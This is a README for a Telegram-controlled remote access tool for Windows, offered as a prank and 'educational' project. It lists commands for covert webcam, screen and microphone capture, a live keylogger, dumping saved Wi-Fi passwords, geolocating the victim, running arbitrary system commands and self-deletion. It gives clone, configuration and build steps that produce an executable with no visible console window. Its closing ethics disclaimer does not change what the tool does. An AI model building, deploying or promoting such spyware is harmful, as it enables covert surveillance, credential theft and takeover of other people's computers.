# RCPepTelegram
Remote Control Bot, inspired to the previous creation named "Peppino", this one offers much many features, including some pretty original pranks.
(only tested on Windows10/11)

```/help: 
🏠 Main Menu
mainmenu - Sends the main menu.
🛑 System & Shutdown
shutdown - Shut down the PC.
fakeshutdown - Fake system shutdown.
altf4 - Simulate Alt + F4.
clear - Removes all cv2 windows, closes webcam and removes temporary files.
selfdestruction - Removes the program from the machine permanently.
🌐 Network & Remote Access
wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
getip - Get public IP and geolocation.
📸 Camera & Screen
selfie - Take a webcam selfie.
screenshot - Capture screen.
fullclip - Record screen + webcam.
webcamclip - Record webcam.
screenclip - Record screen.
recordjum - Records 20 second clip of jumpscare.
waitforface - Send a webcam photo when face is detected till timeout.
displaymode - Send a display set menu.
webcamstreamstart - Sets you a link to a webcam stream.
screenstreamstart - Sets you a link to a screen stream.
webcamstreamstop - Stops the webcam stream.
screenstreamstop - Stops the screen stream.
webcamandscreenstreamstart - Sets you a link to a webcam and screen stream.
webcamandscreenstreamstop - Stops the webcam and screen stream.
🔊 Audio & Volume
breath - Play breathing sound.
pss - Play "psst" sound.
microphone - Record mic audio.
mutevolume - Set computer's volume to 0.
fullvolume - Set computer's volume to 100.
setvolume - Set computer's volume level.
getvolume - Gets the computer's volume level.
tralalerotralala - Plays italian brainrot.
mixermenu - Sends a mixer menu.
😈 Pranks & Visuals
jumpscare - Show random jumpscare.
jumpscarenoaudio - Jumpscare no audio.
invertedscreen - Shows inverted colors screenshot.
distortedscreen - Shows distorted screenshot.
messagebox - Show a custom message box.
messagespam - Spam message boxes.
camerawallpaper - Sets webcam's frames as wallpaper.
setvideowallpaper - Sets a video as wallpaper.
💻 System Control
execute - Run system command.
processkiller - Shows a table of processes that you can kill.
terminateprocess - Kills a process by name.
procmonmenu - Shows procmon menu.
procmonadd - Adds a process to the process monitor list.
procmonrem - Removes a process to the process monitor list.
🎮 Input / Device Control
randomkeyboard - Sets all user's input to random characters.
capslock - Activates capslock.
mousecontroller - Sends a mouse controlling menu.
mouselock - Locks the mouse in position.
📋 Messaging
bsend - Send custom text.
id - Get Owner Chat ID.
deletemessages - Deletes the specifed number of messages.
deleteallmessages - Deletes all the messages in this session.
🔒 Can't Open List
cantopenadd - Adds process to cantopenlist.
cantopenremove - Removes process from cantopenlist.
cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.
🧠 Keylogger
keylogger - Records pressed keys on keyboard.
livekeylogger - Sends live updates about what's being typed on the keyboard.
🦑 Misc
plankton - Plankton.
urltoast - Shows a url opening windows toast.
planktonnoaudio - Plankton no audio.
johnpork - John Pork.
johnporknoaudio - John Prok no audio.
gabinetti - Gabinetti nella villa.
duckyscript - Execute duckyscript string.
duckyhelp - Show Duckyscript tutorial.
browser - Open URL in browser.
📎 File Input Commands
*sending a photo* - Displays the photo on the screen as a pop-up.
*sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
*sending an audio/voice* - Will play the audio/voice in the background.
*sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
*sending a file with /save and the path will save that file in that path, no matter the extension. (example *photo* /save C:\Users\YOURUSER\Photo\*
📚 Multi-Command
You can run multiple commands at the same time by sending them in the same message but separated by a comma.
For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
jumpscare while recording screen and webcam
```
## Features
- Screen Recording: Record the screen for a specified duration.
- Webcam Recording: Record video from the webcam.
- Keylogging: Log keystrokes and send them to the bot owner.
- Remote Commands: Execute system commands remotely.
- Duckyscript Execution: Execute Duckyscript payloads.
- Audio Recording: Record audio from the microphone.
- Screenshot Capture: Take screenshots of the system.
- Message Boxes: Display custom message boxes on the system.
- System Control: Simulate system shutdowns or other actions.
- Live Webcam and Screen: Use ngrok tunnels to have a live view of the machine.
## Installation
1. Clone the repository

```bash
git clone https://github.com/RiccardoZappitelli/RCPepTelegram

```
2. Install the dependences

```bash
pip install -r requirements.txt

```
## Configuration
Create your own bot with <a href="https://core.telegram.org/bots#botfather">Botfather</a>
Obtain your CHAT ID and BOT TOKEN.
auth.json

```json
{
    "token":"<YOUR TOKEN>",
    "chatid":youchatid,
    "ngrok_token":"<YOUR NGROK TOKEN>"
}

```
## BUILD
```bash
nuitka pep2.py --standalone --windows-console-mode=disable --onefile --follow-imports --msvc=latest --include-data-dir=vfx=vfx --include-data-dir=sfx=sfx --include-data-dir=model=model --include-data-file=auth.json=auth.json

```
## ⚠️ WARNING: Security and Ethical Risks ⚠️
This code is intended for educational purposes only and should not be used in any malicious, unethical, or unauthorized manner. The script contains functionalities that can potentially compromise the security and privacy of a system, including but not limited to:
- Remote Control: The code allows for remote control of a system, including executing commands, capturing screenshots, recording audio/video, and more.
- Keylogging: The script includes keylogging capabilities, which can record keystrokes and send them to a remote user.
- Webcam Access: The script can access and record from the webcam without the user's explicit consent.
- System Manipulation: The script can simulate system shutdowns, open message boxes, and perform other actions that could disrupt normal system operations.
- Duckyscript Execution: The script can execute Duckyscript payloads, which are often used in penetration testing but can also be used maliciously.
## Ethical Considerations
Unauthorized Access: Using this script to access or control a system without the owner's explicit permission is illegal and unethical.
## Privacy Violation: Capturing audio, video, or screenshots without consent is a serious violation of privacy.
Potential for Abuse: This script can be easily modified for malicious purposes, such as spying, data theft, or system disruption.
## Security Risks
- Exposure of Sensitive Data: If the script is not properly secured, sensitive information such as Telegram API tokens, chat IDs, and recorded data could be exposed.
- Remote Exploitation: If the script is deployed in an insecure environment, it could be exploited by attackers to gain unauthorized access to the system.
## Recommendations
- Use Responsibly: Only use this script in environments where you have explicit permission to do so, such as your own systems or systems you are authorized to test.
- Secure Your Environment: Ensure that any API tokens, chat IDs, or other sensitive information are kept secure and not exposed to unauthorized users.
- Legal Compliance: Be aware of and comply with all applicable laws and regulations regarding system access, privacy, and data protection.
- By using this code, you acknowledge and accept full responsibility for any actions taken with it. The author of this code is not responsible for any misuse, damage, or legal consequences that may arise from its use.